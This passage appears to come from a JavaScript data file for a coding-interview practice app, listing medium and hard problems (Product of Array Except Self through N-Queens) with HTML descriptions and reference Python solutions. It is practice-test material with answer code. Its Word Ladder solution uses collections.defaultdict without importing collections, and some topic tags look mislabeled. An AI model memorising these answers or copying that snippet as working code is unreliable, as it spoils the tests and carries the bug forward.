            description: `You are given a string <code>s</code> and an integer <code>k</code>. You can choose any character in the string and change it to any other uppercase English character. Find the length of the longest substring containing the same letter you can get after performing at most <code>k</code> operations.<br><br><pre><strong>Input:</strong> s = "XYYX", k = 2
<strong>Output:</strong> 4</pre>`,
            code: 'def character_replacement(s, k):\n    count = {}\n    max_f = 0\n    l = 0\n    for r in range(len(s)):\n        count[s[r]] = 1 + count.get(s[r], 0)\n        max_f = max(max_f, count[s[r]])\n        if (r - l + 1) - max_f > k:\n            count[s[l]] -= 1\n            l += 1\n    return (len(s) - l)'
        },
        {
            name: 'Product of Array Except Self',
            difficulty: 'MEDIUM',
            category: 'ARRAY',
            topics: ['ARRAY'],
            description: `Given an integer array <code>nums</code>, return an array <code>answer</code> such that <code>answer[i]</code> is equal to the product of all the elements of <code>nums</code> except <code>nums[i]</code>.<br><br><pre><strong>Input:</strong> nums = [1,2,3,4]
<strong>Output:</strong> [24,12,8,6]</pre>`,
            code: 'def product_except_self(nums):\n    res = [1] * len(nums)\n    prefix = 1\n    for i in range(len(nums)):\n        res[i] = prefix\n        prefix *= nums[i]\n    postfix = 1\n    for i in range(len(nums) - 1, -1, -1):\n        res[i] *= postfix\n        postfix *= nums[i]\n    return res'
        },
        {
            name: 'Top K Frequent Elements',
            difficulty: 'MEDIUM',
            category: 'HEAP',
            topics: ['HEAP'],
            description: `Given an integer array <code>nums</code> and an integer <code>k</code>, return the <code>k</code> most frequent elements.<br><br><pre><strong>Input:</strong> nums = [1,1,1,2,2,3], k = 2
<strong>Output:</strong> [1,2]</pre>`,
            code: 'import heapq\ndef top_k_frequent(nums, k):\n    count = {}\n    for n in nums:\n        count[n] = 1 + count.get(n, 0)\n    heap = []\n    for n, freq in count.items():\n        heapq.heappush(heap, (freq, n))\n        if len(heap) > k:\n            heapq.heappop(heap)\n    return [pair[1] for pair in heap]'
        },
        {
            name: 'Valid Sudoku',
            difficulty: 'MEDIUM',
            category: 'ARRAY',
            topics: ['ARRAY'],
            description: `Determine if a 9 x 9 Sudoku board is valid. Only the filled cells need to be validated according to the traditional Sudoku rules.<br><br><pre><strong>Input:</strong> board = [["5","3",".",".","7",".",".",".","."],...]
<strong>Output:</strong> true</pre>`,
            code: 'def is_valid_sudoku(board):\n    cols = [set() for _ in range(9)]\n    rows = [set() for _ in range(9)]\n    squares = [set() for _ in range(9)]\n    for r in range(9):\n        for c in range(9):\n            if board[r][c] == ".": continue\n            v = board[r][c]\n            s_idx = (r // 3) * 3 + (c // 3)\n            if v in rows[r] or v in cols[c] or v in squares[s_idx]:\n                return False\n            rows[r].add(v)\n            cols[c].add(v)\n            squares[s_idx].add(v)\n    return True'
        },
        {
            name: 'Binary Tree Level Order',
            difficulty: 'MEDIUM',
            category: 'TREE',
            topics: ['TREE', 'DFS', 'BFS'],
            description: `Given the <code>root</code> of a binary tree, return the level order traversal of its nodes' values. (i.e., from left to right, level by level).<br><br><pre><strong>Input:</strong> root = [3,9,20,null,null,15,7]
<strong>Output:</strong> [[3],[9,20],[15,7]]</pre>`,
            code: 'from collections import deque\ndef level_order(root):\n    if not root: return []\n    res = []\n    q = deque([root])\n    while q:\n        level = []\n        for i in range(len(q)):\n            node = q.popleft()\n            level.append(node.val)\n            if node.left: q.append(node.left)\n            if node.right: q.append(node.right)\n        res.append(level)\n    return res'
        },
        {
            name: 'Construct BT from Pre/In',
            difficulty: 'MEDIUM',
            category: 'TREE',
            topics: ['TREE'],
            description: `Given two integer arrays <code>preorder</code> and <code>inorder</code> where preorder is the preorder traversal of a binary tree and inorder is the inorder traversal of the same tree, construct and return the binary tree.<br><br><pre><strong>Input:</strong> preorder = [3,9,20,15,7], inorder = [9,3,15,20,7]
<strong>Output:</strong> [3,9,20,null,null,15,7]</pre>`,
            code: 'def build_tree(preorder, inorder):\n    if not preorder or not inorder:\n        return None\n    root = TreeNode(preorder[0])\n    mid = inorder.index(preorder[0])\n    root.left = build_tree(preorder[1:mid+1], inorder[:mid])\n    root.right = build_tree(preorder[mid+1:], inorder[mid+1:])\n    return root'
        },
        {
            name: 'Kth Smallest in BST',
            difficulty: 'MEDIUM',
            category: 'TREE',
            topics: ['TREE'],
            description: `Given the <code>root</code> of a binary search tree, and an integer <code>k</code>, return the <code>k</code>th smallest value (1-indexed) of all the values of the nodes in the tree.<br><br><pre><strong>Input:</strong> root = [3,1,4,null,2], k = 1
<strong>Output:</strong> 1</pre>`,
            code: 'def kth_smallest(root, k):\n    stack = []\n    curr = root\n    while stack or curr:\n        while curr:\n            stack.append(curr)\n            curr = curr.left\n        curr = stack.pop()\n        k -= 1\n        if k == 0:\n            return curr.val\n        curr = curr.right'
        },
        {
            name: 'Validate BST',
            difficulty: 'MEDIUM',
            category: 'TREE',
            topics: ['TREE'],
            description: `Given the <code>root</code> of a binary tree, determine if it is a valid binary search tree (BST).<br><br><pre><strong>Input:</strong> root = [2,1,3]
<strong>Output:</strong> true</pre>`,
            code: 'def is_valid_bst(root):\n    def validate(node, low, high):\n        if not node: return True\n        if not (low < node.val < high):\n            return False\n        return validate(node.left, low, node.val) and validate(node.right, node.val, high)\n    return validate(root, float("-inf"), float("inf"))'
        },
        {
            name: 'BT Right Side View',
            difficulty: 'MEDIUM',
            category: 'TREE',
            topics: ['TREE'],
            description: `Given the <code>root</code> of a binary tree, imagine yourself standing on the right side of it, return the values of the nodes you can see ordered from top to bottom.<br><br><pre><strong>Input:</strong> root = [1,2,3,null,5,null,4]
<strong>Output:</strong> [1,3,4]</pre>`,
            code: 'from collections import deque\ndef right_side_view(root):\n    if not root: return []\n    res = []\n    q = deque([root])\n    while q:\n        rightmost = None\n        for i in range(len(q)):\n            node = q.popleft()\n            rightmost = node\n            if node.left: q.append(node.left)\n            if node.right: q.append(node.right)\n        res.append(rightmost.val)\n    return res'
        },
        {
            name: 'Number of Islands',
            difficulty: 'MEDIUM',
            category: 'GRAPHS',
            topics: ['GRAPHS'],
            description: `Given an <code>m x n</code> 2D binary grid <code>grid</code> which represents a map of '1's (land) and '0's (water), return the number of islands.<br><br><pre><strong>Input:</strong> grid = [["1","1","0"],["0","0","1"]] 
<strong>Output:</strong> 2</pre>`,
            code: 'def num_islands(grid):\n    if not grid: return 0\n    rows, cols = len(grid), len(grid[0])\n    islands = 0\n    def dfs(r, c):\n        if r < 0 or c < 0 or r >= rows or c >= cols or grid[r][c] == "0":\n            return\n        grid[r][c] = "0"\n        dfs(r+1, c); dfs(r-1, c); dfs(r, c+1); dfs(r, c-1)\n    for r in range(rows):\n        for c in range(cols):\n            if grid[r][c] == "1":\n                islands += 1\n                dfs(r, c)\n    return islands'
        },
        {
            name: 'Clone Graph',
            difficulty: 'MEDIUM',
            category: 'GRAPHS',
            topics: ['GRAPHS'],
            description: `Given a reference of a node in a connected undirected graph. Return a deep copy (clone) of the graph.<br><br><pre><strong>Input:</strong> adjList = [[2,4],[1,3],[2,4],[1,3]]
<strong>Output:</strong> [[2,4],[1,3],[2,4],[1,3]]</pre>`,
            code: 'def clone_graph(node):\n    old_to_new = {}\n    def dfs(node):\n        if node in old_to_new:\n            return old_to_new[node]\n        copy = Node(node.val)\n        old_to_new[node] = copy\n        for nei in node.neighbors:\n            copy.neighbors.append(dfs(nei))\n        return copy\n    return dfs(node) if node else None'
        },
        {
            name: 'Course Schedule',
            difficulty: 'MEDIUM',
            category: 'GRAPHS',
            topics: ['GRAPHS'],
            description: `There are a total of <code>numCourses</code> courses you have to take, labeled from 0 to <code>numCourses - 1</code>. Some courses have prerequisites. Return <code>true</code> if you can finish all courses.<br><br><pre><strong>Input:</strong> numCourses = 2, pre = [[1,0]]
<strong>Output:</strong> true</pre>`,
            code: 'def can_finish(numCourses, prerequisites):\n    adj = {i: [] for i in range(numCourses)}\n    for crs, pre in prerequisites: adj[crs].append(pre)\n    visit = set()\n    def dfs(crs):\n        if crs in visit: return False\n        if adj[crs] == []: return True\n        visit.add(crs)\n        for pre in adj[crs]:\n            if not dfs(pre): return False\n        visit.remove(crs)\n        adj[crs] = []\n        return True\n    for c in range(numCourses):\n        if not dfs(c): return False\n    return True'
        },
        {
            name: 'Pacific Atlantic Water',
            difficulty: 'MEDIUM',
            category: 'GRAPHS',
            topics: ['GRAPHS'],
            description: `Find all grid coordinates from which water can flow to both the Pacific and Atlantic oceans.<br><br><pre><strong>Input:</strong> heights = [[1,2,2,3,5],[3,2,3,4,4],...]
<strong>Output:</strong> [[0,4],[1,3],[1,4],...]</pre>`,
            code: 'def pacific_atlantic(heights):\n    R, C = len(heights), len(heights[0])\n    pac, atl = set(), set()\n    def dfs(r, c, visit, prevH):\n        if (r,c) in visit or r<0 or c<0 or r==R or c==C or heights[r][c]<prevH:\n            return\n        visit.add((r,c))\n        dfs(r+1,c,visit,heights[r][c]); dfs(r-1,c,visit,heights[r][c])\n        dfs(r,c+1,visit,heights[r][c]); dfs(r,c-1,visit,heights[r][c])\n    for c in range(C):\n        dfs(0,c,pac,heights[0][c]); dfs(R-1,c,atl,heights[R-1][c])\n    for r in range(R):\n        dfs(r,0,pac,heights[r][0]); dfs(r,C-1,atl,heights[r][C-1])\n    return list(pac & atl)'
        },
        {
            name: 'Rotting Oranges',
            difficulty: 'MEDIUM',
            category: 'GRAPHS',
            topics: ['GRAPHS'],
            description: `Determine the minimum time until no fresh oranges remain. Each minute, any fresh orange that is 4-directionally adjacent to a rotten orange becomes rotten.<br><br><pre><strong>Input:</strong> grid = [[2,1,1],[1,1,0],[0,1,1]]
<strong>Output:</strong> 4</pre>`,
            code: 'from collections import deque\ndef oranges_rotting(grid):\n    q = deque(); fresh, time = 0, 0\n    R, C = len(grid), len(grid[0])\n    for r in range(R):\n        for c in range(C):\n            if grid[r][c] == 1: fresh += 1\n            if grid[r][c] == 2: q.append([r,c])\n    while q and fresh > 0:\n        for i in range(len(q)):\n            r, c = q.popleft()\n            for dr, dc in [[0,1],[0,-1],[1,0],[-1,0]]:\n                row, col = r+dr, c+dc\n                if 0<=row<R and 0<=col<C and grid[row][col]==1:\n                    grid[row][col]=2; q.append([row,col]); fresh-=1\n        time += 1\n    return time if fresh == 0 else -1'
        },
        {
            name: 'Reorder List',
            difficulty: 'MEDIUM',
            category: 'LINKED LIST',
            topics: ['LINKED LIST'],
            description: `You are given the head of a singly linked-list. Reorder it as: <code>L0 → Ln → L1 → Ln-1 → L2 → Ln-2 → …</code><br><br><pre><strong>Input:</strong> head = [1,2,3,4]
<strong>Output:</strong> [1,4,2,3]</pre>`,
            code: 'def reorder_list(head):\n    slow, fast = head, head.next\n    while fast and fast.next:\n        slow, fast = slow.next, fast.next.next\n    second = slow.next; prev = slow.next = None\n    while second:\n        tmp = second.next; second.next = prev\n        prev = second; second = tmp\n    first, second = head, prev\n    while second:\n        tmp1, tmp2 = first.next, second.next\n        first.next, second.next = second, tmp1\n        first, second = tmp1, tmp2'
        },
        {
            name: 'Remove Nth Node From End',
            difficulty: 'MEDIUM',
            category: 'LINKED LIST',
            topics: ['LINKED LIST'],
            description: `Given the <code>head</code> of a linked list, remove the <code>n</code>th node from the end of the list and return its head.<br><br><pre><strong>Input:</strong> head = [1,2,3,4,5], n = 2
<strong>Output:</strong> [1,2,3,5]</pre>`,
            code: 'def remove_nth_from_end(head, n):\n    dummy = ListNode(0, head)\n    left = dummy; right = head\n    while n > 0: right = right.next; n -= 1\n    while right:\n        left = left.next; right = right.next\n    left.next = left.next.next\n    return dummy.next'
        },
        {
            name: 'Add Two Numbers',
            difficulty: 'MEDIUM',
            category: 'LINKED LIST',
            topics: ['LINKED LIST', 'MATH'],
            description: `Two numbers represented by linked lists in reverse order. Add the two numbers and return the sum as a linked list.<br><br><pre><strong>Input:</strong> l1 = [2,4,3], l2 = [5,6,4]
<strong>Output:</strong> [7,0,8]</pre>`,
            code: 'def add_two_numbers(l1, l2):\n    dummy = ListNode(); curr = dummy; carry = 0\n    while l1 or l2 or carry:\n        v1 = l1.val if l1 else 0\n        v2 = l2.val if l2 else 0\n        val = v1 + v2 + carry\n        carry = val // 10; curr.next = ListNode(val % 10)\n        curr = curr.next; l1 = l1.next if l1 else None; l2 = l2.next if l2 else None\n    return dummy.next'
        },
        {
            name: 'Set Matrix Zeroes',
            difficulty: 'MEDIUM',
            category: 'ARRAY',
            topics: ['ARRAY'],
            description: `Given an <code>m x n</code> integer matrix <code>matrix</code>, if an element is 0, set its entire row and column to 0's. Do it in-place.<br><br><pre><strong>Input:</strong> matrix = [[1,1,1],[1,0,1],[1,1,1]]
<strong>Output:</strong> [[1,0,1],[0,0,0],[1,0,1]]</pre>`,
            code: 'def set_zeroes(matrix):\n    R, C = len(matrix), len(matrix[0])\n    row_zero = False\n    for r in range(R):\n        for c in range(C):\n            if matrix[r][c] == 0:\n                matrix[0][c] = 0\n                if r > 0: matrix[r][0] = 0\n                else: row_zero = True\n    for r in range(1, R):\n        for c in range(1, C):\n            if matrix[0][c] == 0 or matrix[r][0] == 0: matrix[r][c] = 0\n    if matrix[0][0] == 0:\n        for r in range(R): matrix[r][0] = 0\n    if row_zero:\n        for c in range(C): matrix[0][c] = 0'
        },
        {
            name: 'Min in Rotated Sorted Array',
            difficulty: 'MEDIUM',
            category: 'BINARY SEARCH',
            topics: ['BINARY SEARCH', 'SORTING'],
            description: `Find the minimum element in a sorted rotated array of unique elements.<br><br><pre><strong>Input:</strong> nums = [3,4,5,1,2]
<strong>Output:</strong> 1</pre>`,
            code: 'def find_min(nums):\n    res = nums[0]; l, r = 0, len(nums) - 1\n    while l <= r:\n        if nums[l] < nums[r]: res = min(res, nums[l]); break\n        m = (l + r) // 2; res = min(res, nums[m])\n        if nums[m] >= nums[l]: l = m + 1\n        else: r = m - 1\n    return res'
        },
        {
            name: 'Search in Rotated Array',
            difficulty: 'MEDIUM',
            category: 'BINARY SEARCH',
            topics: ['BINARY SEARCH'],
            description: `Search for a target value in a sorted rotated array. If found, return its index. Otherwise, return -1.<br><br><pre><strong>Input:</strong> nums = [4,5,6,7,0,1,2], target = 0
<strong>Output:</strong> 4</pre>`,
            code: 'def search(nums, target):\n    l, r = 0, len(nums) - 1\n    while l <= r:\n        mid = (l + r) // 2\n        if target == nums[mid]: return mid\n        if nums[l] <= nums[mid]:\n            if target > nums[mid] or target < nums[l]: l = mid + 1\n            else: r = mid - 1\n        else:\n            if target < nums[mid] or target > nums[r]: r = mid - 1\n            else: l = mid + 1\n    return -1'
        },
        {
            name: 'Kth Largest in Array',
            difficulty: 'MEDIUM',
            category: 'HEAP',
            topics: ['HEAP'],
            description: `Find the <code>k</code>th largest element in an unsorted array.<br><br><pre><strong>Input:</strong> nums = [3,2,1,5,6,4], k = 2
<strong>Output:</strong> 5</pre>`,
            code: 'import heapq\ndef find_kth_largest(nums, k):\n    heap = nums[:k]\n    heapq.heapify(heap)\n    for n in nums[k:]:\n        if n > heap[0]:\n            heapq.heapreplace(heap, n)\n    return heap[0]'
        },
        {
            name: 'Subsets',
            difficulty: 'MEDIUM',
            category: 'BACKTRACKING',
            topics: ['BACKTRACKING'],
            description: `Given an integer array <code>nums</code> of unique elements, return all possible subsets (the power set).<br><br><pre><strong>Input:</strong> nums = [1,2,3]
<strong>Output:</strong> [[],[1],[2],[1,2],[3],[1,3],[2,3],[1,2,3]]</pre>`,
            code: 'def subsets(nums):\n    res = []\n    subset = []\n    def dfs(i):\n        if i >= len(nums): res.append(subset[:]); return\n        subset.append(nums[i]); dfs(i + 1)\n        subset.pop(); dfs(i + 1)\n    dfs(0); return res'
        },
        {
            name: 'Combination Sum',
            difficulty: 'MEDIUM',
            category: 'BACKTRACKING',
            topics: ['BACKTRACKING', 'MATH'],
            description: `Find all unique combinations in <code>candidates</code> where the candidate numbers sum to <code>target</code>. You may use the same number an unlimited number of times.<br><br><pre><strong>Input:</strong> candidates = [2,3,6,7], target = 7
<strong>Output:</strong> [[2,2,3],[7]]</pre>`,
            code: 'def combination_sum(candidates, target):\n    res = []\n    def dfs(i, cur, total):\n        if total == target: res.append(cur[:]); return\n        if i >= len(candidates) or total > target: return\n        cur.append(candidates[i]); dfs(i, cur, total + candidates[i])\n        cur.pop(); dfs(i + 1, cur, total)\n    dfs(0, [], 0); return res'
        },
        {
            name: 'Permutations',
            difficulty: 'MEDIUM',
            category: 'BACKTRACKING',
            topics: ['BACKTRACKING'],
            description: `Given an array <code>nums</code> of distinct integers, return all the possible permutations.<br><br><pre><strong>Input:</strong> nums = [1,2,3]
<strong>Output:</strong> [[1,2,3],[1,3,2],[2,1,3],[2,3,1],[3,1,2],[3,2,1]]</pre>`,
            code: 'def permute(nums):\n    res = []\n    if len(nums) == 1: return [nums[:]]\n    for i in range(len(nums)):\n        n = nums.pop(0)\n        perms = permute(nums)\n        for p in perms: p.append(n)\n        res.extend(perms); nums.append(n)\n    return res'
        },
        {
            name: 'Word Search',
            difficulty: 'MEDIUM',
            category: 'BACKTRACKING',
            topics: ['BACKTRACKING', 'BINARY SEARCH'],
            description: `Given an <code>m x n</code> grid of characters <code>board</code> and a string <code>word</code>, return <code>true</code> if the word exists in the grid.<br><br><pre><strong>Input:</strong> board = [["A","B","C","E"],["S","F","C","S"],...], word = "ABCCED"
<strong>Output:</strong> true</pre>`,
            code: 'def exist(board, word):\n    R, C = len(board), len(board[0]); visit = set()\n    def dfs(r, c, i):\n        if i == len(word): return True\n        if r<0 or c<0 or r>=R or c>=C or word[i]!=board[r][c] or (r,c) in visit: return False\n        visit.add((r,c))\n        res = dfs(r+1,c,i+1) or dfs(r-1,c,i+1) or dfs(r,c+1,i+1) or dfs(r,c-1,i+1)\n        visit.remove((r,c)); return res\n    for r in range(R):\n        for c in range(C):\n            if dfs(r,c,0): return True\n    return False'
        },
        {
            name: 'House Robber',
            difficulty: 'MEDIUM',
            category: 'DYNAMIC PROG',
            topics: ['DYNAMIC PROG'],
            description: `You are a professional robber planning to rob houses along a street. Each house has a certain amount of money stashed. You cannot rob two adjacent houses.<br><br><pre><strong>Input:</strong> nums = [1,2,3,1]
<strong>Output:</strong> 4</pre>`,
            code: 'def rob(nums):\n    rob1, rob2 = 0, 0\n    for n in nums: \n        tmp = max(n + rob1, rob2)\n        rob1 = rob2; rob2 = tmp\n    return rob2'
        },
        {
            name: 'House Robber II',
            difficulty: 'MEDIUM',
            category: 'DYNAMIC PROG',
            topics: ['DYNAMIC PROG'],
            description: `Same as House Robber, but houses are arranged in a circle. The first house is the neighbor of the last one.<br><br><pre><strong>Input:</strong> nums = [2,3,2]
<strong>Output:</strong> 3</pre>`,
            code: 'def rob_circular(nums):\n    def helper(nums):\n        r1, r2 = 0, 0\n        for n in nums:\n            tmp = max(n + r1, r2)\n            r1, r2 = r2, tmp\n        return r2\n    return max(nums[0], helper(nums[1:]), helper(nums[:-1]))'
        },
        {
            name: 'Longest Palindromic Substr',
            difficulty: 'MEDIUM',
            category: 'DYNAMIC PROG',
            topics: ['DYNAMIC PROG'],
            description: `Given a string <code>s</code>, return the longest palindromic substring in <code>s</code>.<br><br><pre><strong>Input:</strong> s = "babad"
<strong>Output:</strong> "bab"</pre>`,
            code: 'def longest_palindrome(s):\n    res = ""; resL = 0\n    for i in range(len(s)):\n        l, r = i, i\n        while l >= 0 and r < len(s) and s[l] == s[r]:\n            if (r - l + 1) > resL: res = s[l:r+1]; resL = r - l + 1\n            l -= 1; r += 1\n        l, r = i, i + 1\n        while l >= 0 and r < len(s) and s[l] == s[r]:\n            if (r - l + 1) > resL: res = s[l:r+1]; resL = r - l + 1\n            l -= 1; r += 1\n    return res'
        },
        {
            name: 'Palindromic Substrings',
            difficulty: 'MEDIUM',
            category: 'DYNAMIC PROG',
            topics: ['DYNAMIC PROG', 'SLIDING WINDOW'],
            description: `Given a string <code>s</code>, return the number of palindromic substrings in it.<br><br><pre><strong>Input:</strong> s = "aaa"
<strong>Output:</strong> 6</pre>`,
            code: 'def count_substrings(s):\n    res = 0\n    for i in range(len(s)):\n        l = r = i\n        while l >= 0 and r < len(s) and s[l] == s[r]:\n            res += 1; l -= 1; r += 1\n        l, r = i, i + 1\n        while l >= 0 and r < len(s) and s[l] == s[r]:\n            res += 1; l -= 1; r += 1\n    return res'
        },
        {
            name: 'Coin Change',
            difficulty: 'MEDIUM',
            category: 'DYNAMIC PROG',
            topics: ['DYNAMIC PROG'],
            description: `Given an integer array <code>coins</code> and an integer <code>amount</code>, return the fewest number of coins that you need to make up that amount.<br><br><pre><strong>Input:</strong> coins = [1,2,5], amount = 11
<strong>Output:</strong> 3</pre>`,
            code: 'def coin_change(coins, amount):\n    dp = [amount + 1] * (amount + 1); dp[0] = 0\n    for a in range(1, amount + 1):\n        for c in coins:\n            if a - c >= 0: dp[a] = min(dp[a], 1 + dp[a - c])\n    return dp[amount] if dp[amount] != amount + 1 else -1'
        },
        {
            name: 'Maximum Product Subarray',
            difficulty: 'MEDIUM',
            category: 'DYNAMIC PROG',
            topics: ['DYNAMIC PROG', 'SLIDING WINDOW'],
            description: `Given an integer array <code>nums</code>, find a subarray that has the largest product, and return the product.<br><br><pre><strong>Input:</strong> nums = [2,3,-2,4]
<strong>Output:</strong> 6</pre>`,
            code: 'def max_product(nums):\n    res = max(nums); curMin, curMax = 1, 1\n    for n in nums:\n        if n == 0: curMin, curMax = 1, 1; continue\n        tmp = curMax * n\n        curMax = max(n*curMax, n*curMin, n)\n        curMin = min(tmp, n*curMin, n)\n        res = max(res, curMax)\n    return res'
        },
        {
            name: 'Word Break',
            difficulty: 'MEDIUM',
            category: 'DYNAMIC PROG',
            topics: ['DYNAMIC PROG'],
            description: `Given a string <code>s</code> and a dictionary of strings <code>wordDict</code>, return <code>true</code> if <code>s</code> can be segmented into a space-separated sequence of one or more dictionary words.<br><br><pre><strong>Input:</strong> s = "leetcode", wordDict = ["leet","code"]
<strong>Output:</strong> true</pre>`,
            code: 'def word_break(s, wordDict):\n    dp = [False] * (len(s) + 1); dp[len(s)] = True\n    for i in range(len(s) - 1, -1, -1):\n        for w in wordDict:\n            if (i + len(w)) <= len(s) and s[i : i + len(w)] == w:\n                dp[i] = dp[i + len(w)]\n            if dp[i]: break\n    return dp[0]'
        },
        {
            name: 'Longest Increasing Subseq',
            difficulty: 'MEDIUM',
            category: 'DYNAMIC PROG',
            topics: ['DYNAMIC PROG'],
            description: `Given an integer array <code>nums</code>, return the length of the longest strictly increasing subsequence.<br><br><pre><strong>Input:</strong> nums = [10,9,2,5,3,7,101,18]
<strong>Output:</strong> 4</pre>`,
            code: 'def length_of_lis(nums):\n    LIS = [1] * len(nums)\n    for i in range(len(nums) - 1, -1, -1):\n        for j in range(i + 1, len(nums)):\n            if nums[i] < nums[j]: LIS[i] = max(LIS[i], 1 + LIS[j])\n    return max(LIS)'
        },
        {
            name: 'Jump Game',
            difficulty: 'MEDIUM',
            category: 'GREEDY',
            topics: ['GREEDY'],
            description: `You are given an integer array <code>nums</code>. You are initially positioned at the first index. Determine if you can reach the last index.<br><br><pre><strong>Input:</strong> nums = [2,3,1,1,4]
<strong>Output:</strong> true</pre>`,
            code: 'def can_jump(nums):\n    goal = len(nums) - 1\n    for i in range(len(nums) - 2, -1, -1):\n        if i + nums[i] >= goal: goal = i\n    return goal == 0'
        },
        {
            name: 'LCA of Binary Tree',
            difficulty: 'MEDIUM',
            category: 'TREE',
            topics: ['TREE', 'DFS'],
            description: `Given a binary tree, find the lowest common ancestor (LCA) of two given nodes <code>p</code> and <code>q</code>.<br><br><pre><strong>Input:</strong> root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 1
<strong>Output:</strong> 3</pre>`,
            code: 'def lca(root, p, q):\n    if not root or root == p or root == q: return root\n    left = lca(root.left, p, q)\n    right = lca(root.right, p, q)\n    if left and right: return root\n    return left or right'
        },
        {
            name: 'Median Two Arrays',
            difficulty: 'HARD',
            category: 'BINARY SEARCH',
            topics: ['BINARY SEARCH'],
            description: `Given two sorted arrays <code>nums1</code> and <code>nums2</code>, return the median of the two sorted arrays. The overall run time complexity should be <code>O(log(m+n))</code>.<br><br><pre><strong>Input:</strong> nums1 = [1,3], nums2 = [2]
<strong>Output:</strong> 2.0</pre>`,
            code: 'def find_median_sorted_arrays(nums1, nums2):\n    A, B = nums1, nums2\n    total = len(nums1) + len(nums2); half = total // 2\n    if len(B) < len(A): A, B = B, A\n    l, r = 0, len(A) - 1\n    while True:\n        i = (l + r) // 2; j = half - i - 2\n        Aleft = A[i] if i >= 0 else float("-inf")\n        Aright = A[i+1] if (i+1) < len(A) else float("inf")\n        Bleft = B[j] if j >= 0 else float("-inf")\n        Bright = B[j+1] if (j+1) < len(B) else float("inf")\n        if Aleft <= Bright and Bleft <= Aright:\n            if total % 2: return min(Aright, Bright)\n            return (max(Aleft, Bleft) + min(Aright, Bright)) / 2\n        elif Aleft > Bright: r = i - 1\n        else: l = i + 1'
        },
        {
            name: 'Merge k Sorted Lists',
            difficulty: 'HARD',
            category: 'HEAP',
            topics: ['HEAP', 'SORTING'],
            description: `You are given an array of <code>k</code> linked-lists, each sorted in ascending order. Merge all the linked-lists into one sorted linked-list.<br><br><pre><strong>Input:</strong> lists = [[1,4,5],[1,3,4],[2,6]]
<strong>Output:</strong> [1,1,2,3,4,4,5,6]</pre>`,
            code: 'import heapq\ndef merge_k_lists(lists):\n    h = []; dummy = ListNode(); curr = dummy\n    for i, l in enumerate(lists):\n        if l: heapq.heappush(h, (l.val, i, l))\n    while h:\n        val, i, node = heapq.heappop(h)\n        curr.next = ListNode(val); curr = curr.next\n        if node.next: heapq.heappush(h, (node.next.val, i, node.next))\n    return dummy.next'
        },
        {
            name: 'Trapping Rain Water',
            difficulty: 'HARD',
            category: 'TWO POINTERS',
            topics: ['TWO POINTERS'],
            description: `Given <code>n</code> non-negative integers representing an elevation map where the width of each bar is 1, compute how much water it can trap after raining.<br><br><pre><strong>Input:</strong> height = [0,1,0,2,1,0,1,3,2,1,2,1]
<strong>Output:</strong> 6</pre>`,
            code: 'def trap(height):\n    if not height: return 0\n    l, r = 0, len(height) - 1\n    leftMax, rightMax = height[l], height[r]\n    res = 0\n    while l < r:\n        if leftMax < rightMax:\n            l += 1; leftMax = max(leftMax, height[l])\n            res += leftMax - height[l]\n        else:\n            r -= 1; rightMax = max(rightMax, height[r])\n            res += rightMax - height[r]\n    return res'
        },
        {
            name: 'Reverse k-Group',
            difficulty: 'HARD',
            category: 'LINKED LIST',
            topics: ['LINKED LIST'],
            description: `Given the head of a linked list, reverse the nodes of the list <code>k</code> at a time, and return the modified list.<br><br><pre><strong>Input:</strong> head = [1,2,3,4,5], k = 2
<strong>Output:</strong> [2,1,4,3,5]</pre>`,
            code: 'def reverse_k_group(head, k):\n    dummy = ListNode(0, head); groupPrev = dummy\n    while True:\n        kth = get_kth(groupPrev, k)\n        if not kth: break\n        groupNext = kth.next; prev, curr = kth.next, groupPrev.next\n        while curr != groupNext:\n            tmp = curr.next; curr.next = prev\n            prev = curr; curr = tmp\n        tmp = groupPrev.next; groupPrev.next = kth; groupPrev = tmp\n    return dummy.next\ndef get_kth(curr, k):\n    while curr and k > 0: curr = curr.next; k -= 1\n    return curr'
        },
        {
            name: 'BT Max Path Sum',
            difficulty: 'HARD',
            category: 'TREE',
            topics: ['TREE', 'MATH'],
            description: `Given the <code>root</code> of a binary tree, return the maximum path sum of any non-empty path.<br><br><pre><strong>Input:</strong> root = [-10,9,20,null,null,15,7]
<strong>Output:</strong> 42</pre>`,
            code: 'def max_path_sum(root):\n    res = [root.val]\n    def dfs(node):\n        if not node: return 0\n        leftMax = max(dfs(node.left), 0)\n        rightMax = max(dfs(node.right), 0)\n        res[0] = max(res[0], node.val + leftMax + rightMax)\n        return node.val + max(leftMax, rightMax)\n    dfs(root); return res[0]'
        },
        {
            name: 'Word Ladder',
            difficulty: 'HARD',
            category: 'GRAPHS',
            topics: ['GRAPHS'],
            description: `Given two words, beginWord and endWord, and a dictionary wordList, return the length of the shortest transformation sequence from beginWord to endWord.<br><br><pre><strong>Input:</strong> beginWord = "hit", endWord = "cog", wordList = ["hot","dot","dog","lot","log","cog"]
<strong>Output:</strong> 5</pre>`,
            code: 'from collections import deque\ndef ladder_length(beginWord, endWord, wordList):\n    if endWord not in wordList: return 0\n    nei = collections.defaultdict(list); wordList.append(beginWord)\n    for word in wordList:\n        for j in range(len(word)):\n            pattern = word[:j] + "*" + word[j + 1 :]\n            nei[pattern].append(word)\n    visit = set([beginWord]); q = deque([beginWord]); res = 1\n    while q:\n        for i in range(len(q)):\n            word = q.popleft()\n            if word == endWord: return res\n            for j in range(len(word)):\n                pattern = word[:j] + "*" + word[j + 1 :]\n                for neighbor in nei[pattern]:\n                    if neighbor not in visit:\n                        visit.add(neighbor); q.append(neighbor)\n        res += 1\n    return 0'
        },
        {
            name: 'N-Queens',
            difficulty: 'HARD',
            category: 'BACKTRACKING',
            topics: ['BACKTRACKING'],
            description: `The n-queens puzzle is the problem of placing n queens on an n x n chessboard such that no two queens attack each other. Return all distinct solutions.<br><br><pre><strong>Input:</strong> n = 4
<strong>Output:</strong> [[".Q..","...Q","Q...","..Q."],["..Q.","Q...","...Q",".Q.."]]</pre>`,
            code: 'def solve_n_queens(n):\n    col, posDiag, negDiag = set(), set(), set(); res = []\n    board = [["."] * n for _ in range(n)]\n    def backtrack(r):\n        if r == n:\n            copy = ["".join(row) for row in board]; res.append(copy); return\n        for c in range(n):\n            if c in col or (r + c) in posDiag or (r - c) in negDiag: continue\n            col.add(c); posDiag.add(r + c); negDiag.add(r - c)\n            board[r][c] = "Q"; backtrack(r + 1)\n            col.remove(c); posDiag.remove(r + c); negDiag.remove(r - c)\n            board[r][c] = "."\n    backtrack(0); return res'
        },
        {
            name: 'Minimum Window Substr',
            difficulty: 'HARD',
            category: 'SLIDING WINDOW',
            topics: ['SLIDING WINDOW'],
